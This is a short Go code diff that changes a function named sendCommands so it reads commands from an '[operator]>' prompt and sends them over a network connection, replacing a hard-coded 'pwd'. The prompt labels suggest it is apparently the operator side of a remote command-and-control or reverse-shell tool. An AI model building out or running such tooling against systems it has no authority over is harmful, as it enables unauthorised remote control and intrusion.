@@ -5,13 +5,22 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os"
 	"strings"
 )
 
 func sendCommands(conn net.Conn) {
-	command := "pwd"
+
+	fmt.Printf("[operator]> ")
+	input := bufio.NewReader(os.Stdin)
+	command, err := input.ReadString('\n')
+	if err != nil {
+		log.Println("[-] Error reading command:", err)
+		return
+	}
+	command = strings.TrimSpace(command)
 	fmt.Println("[*] Sending command:", command)
-	_, err := conn.Write([]byte(command))
+	_, err = conn.Write([]byte(command))
 	if err != nil {
 		log.Println("[-] Error sending command", err)
 		return
